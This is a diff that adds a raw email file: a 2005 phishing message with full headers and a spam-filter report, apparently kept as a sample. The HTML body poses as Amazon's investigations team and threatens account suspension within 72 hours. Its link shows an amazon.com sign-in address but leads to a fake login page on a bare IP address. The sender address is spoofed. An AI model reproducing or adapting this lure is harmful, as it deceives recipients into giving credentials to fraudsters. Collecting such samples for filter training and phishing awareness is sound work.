@@ -1,0 +1,147 @@
+Return-Path: <nobody@kagoya.net>
+X-Original-To: username@login.domain.com
+Delivered-To: username@login.domain.com
+Received: from mail1.domain.com (mail1.domain.com [10.0.2.3])
+	by naughty.domain.com (Postfix) with ESMTP id 87989536ED1
+	for <username@login.domain.com>; Thu, 15 Sep 2005 10:48:35 -0400 (EDT)
+Received: from mail1.domain.com (localhost.domain.com [127.0.0.1])
+	by mail1.domain.com (Postfix) with ESMTP id 5F08E6CCDCC
+	for <username@domain.com>; Thu, 15 Sep 2005 10:48:30 -0400 (EDT)
+Received: from www391q.kagoya.net (www391q.kagoya.net [210.134.57.111])
+	by mail1.domain.com (Postfix) with ESMTP
+	for <username@domain.com>; Thu, 15 Sep 2005 10:48:30 -0400 (EDT)
+Received: by www391q.kagoya.net (Postfix, from userid 99)
+	id 77437229654; Thu, 15 Sep 2005 23:31:32 +0900 (JST)
+To: username@domain.com
+Subject: Urgent Fraud Prevention Group Notice 
+From: service@amazon.com <service@amazon.com>
+Content-Type: text/html
+Message-Id: <20050915143132.77437229654@www391q.kagoya.net>
+Date: Thu, 15 Sep 2005 23:31:32 +0900 (JST)
+X-Spam-Checker-Version: SpamAssassin 3.0.2 (2004-11-16)
+X-Spam-Level: 
+X-Spam-Status: No, score=-0.5 required=5.0 tests=BAYES_00,EXCUSE_1,HTML_50_60,
+	HTML_MESSAGE,MIME_HEADER_CTYPE_ONLY,MIME_HTML_ONLY,NORMAL_HTTP_TO_IP,
+	RAZOR2_CF_RANGE_51_100,RAZOR2_CHECK autolearn=no version=3.0.2
+X-Spam-Report: 
+	*  0.1 EXCUSE_1 BODY: Gives a lame excuse about why spam was sent
+	*  0.0 NORMAL_HTTP_TO_IP URI: Uses a dotted-decimal IP address in URL
+	*  0.0 HTML_MESSAGE BODY: HTML included in message
+	*  0.1 RAZOR2_CF_RANGE_51_100 BODY: Razor2 gives confidence level above 50%
+	*      [cf: 100]
+	*  0.2 MIME_HTML_ONLY BODY: Message only has text/html MIME parts
+	*  0.1 HTML_50_60 BODY: Message is 50% to 60% HTML
+	* -2.6 BAYES_00 BODY: Bayesian spam probability is 0 to 1%
+	*      [score: 0.0000]
+	*  1.5 RAZOR2_CHECK Listed in Razor2 (http://razor.sf.net/)
+	*  0.1 MIME_HEADER_CTYPE_ONLY 'Content-Type' found without required MIME headers
+X-Keywords:                 
+X-UID: 257
+Status: RO
+Content-Length: 3387
+Lines: 103
+
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<HTML><HEAD>
+<META http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<STYLE></STYLE>
+</HEAD>
+<BODY bgColor=#ffffff>
+<P>
+<TABLE cellSpacing=0 cellPadding=0 width=650 bgColor=#ffffff border=0>
+
+ <TR>
+ <TD>
+ <TABLE borderColor=#ffffff cellSpacing=0 borderColorDark=#ffffff
+ cellPadding=2 width="100%" bgColor=#ffffff borderColorLight=#ffffff
+ border=1>
+
+ <TR>
+ <TD>
+ <P align=left><B><FONT face=Arial>***Urgent Fraud Prevention Group
+ Notice***</FONT></B></P></TD></TR></TABLE></TD></TR>
+ <TR>
+ <TD borderColor=#ffffff borderColorLight=#ffffff bgColor=#ffffff
+ borderColorDark=#ffffff></TD></TR>
+ <TR>
+ <TD borderColor=#cccccc borderColorLight=#cccccc bgColor=#cccccc
+ borderColorDark=#cccccc height=1>&nbsp;</TD></TR>
+ <TR>
+ <TD>&nbsp;</TD></TR>
+ <TR>
+ <TD><FONT face=Arial size=2>You have received this email because we have
+ strong reason to believe that your&nbsp;Amazon account had been recently
+ compromised. In order to prevent any fraudulent activity from occurring we
+ are required to open an investigation into this matter. To speed up this
+ process, you are required to verify your&nbsp;Amazon account by following
+ the link below.</FONT></TD></TR>
+ <TR>
+ <TD>&nbsp;</TD></TR>
+ <TR>
+ <TD></TD></TR>
+ <TR>
+ <TD><FONT face=Arial size=2><A
+ href="http://211.75.52.18/.amazonlogin/index.html"
+ target=_blank onfiltered="return ShowLinkWarning()"><b><FONT
+ color=#003399>http://www.amazon.com/exec/obidos/flex-sign-in/</FONT></b></A><BR><FONT
+ size=1>(To complete the verification process you must fill in all the
+ required fields)</FONT></FONT></TD></TR>
+ <TR>
+ <TD>&nbsp;</TD></TR>
+ <TR>
+ <TD></TD></TR>
+ <TR>
+ <TD bgColor=#eeeef8><FONT face=Arial size=2><b>Please Note:</b>
+ If your account informations are not updated within the next 72 hours,
+ then we will assume this account is fraudulent and will be suspended. We
+ apologize for this inconvenience, but the purpose of this verification is
+ to ensure that your&nbsp;Amazon account has not been fraudulently used and
+ to combat fraud.</FONT></TD></TR>
+ <TR>
+ <TD></TD></TR>
+ <TR>
+ <TD>&nbsp;</TD></TR>
+ <TR>
+ <TD><FONT face=Arial size=2>We appreciate your support and understanding,
+ as we work together to keep&nbsp;Amazon a safe place to
+trade.</FONT></TD></TR>
+ <TR>
+ <TD></TD></TR>
+ <TR>
+ <TD><FONT face=Arial size=2>Thank you for your attention on this serious
+ matter. We apologize for any delay in resolving this
+ situation.</FONT></TD></TR>
+ <TR>
+ <TD>&nbsp;</TD></TR>
+ <TR>
+ <TD></TD></TR>
+ <TR>
+ <TD><FONT face=Arial size=2>Regards,</FONT></TD></TR>
+ <TR>
+ <TD>&nbsp;</TD></TR>
+ <TR>
+ <TD></TD></TR>
+ <TR>
+ <TD><FONT face=Arial size=2>Amazon.com<BR>Investigations Team</FONT></TD></TR>
+ <TR>
+ <TD>&nbsp;</TD></TR>
+ <TR>
+ <TD></TD></TR>
+ <TR>
+ <TD>
+ <TABLE cellSpacing=0 cellPadding=0 width="100%" bgColor=#cccccc>
+
+ <TR>
+ <TD height=1>&nbsp;</TD></TR></TABLE></TD></TR>
+ <TR>
+ <TD>
+ <DIV align=center><FONT face="Arial, Helvetica, sans-serif" color=#666666
+ size=1>Please do not reply to this e-mail as this is only a notification.
+ Mail sent to this address cannot be answered.&nbsp;<BR>Amazon.com treats
+ your personal information with the utmost care, and our Privacy Policy is
+ designed to protect you and your information.<BR>Copyright ©
+ 2005&nbsp;Amazon.com All Rights
+Reserved.</FONT></DIV></TD></TR></TABLE></P>
+</BODY></HTML>
+
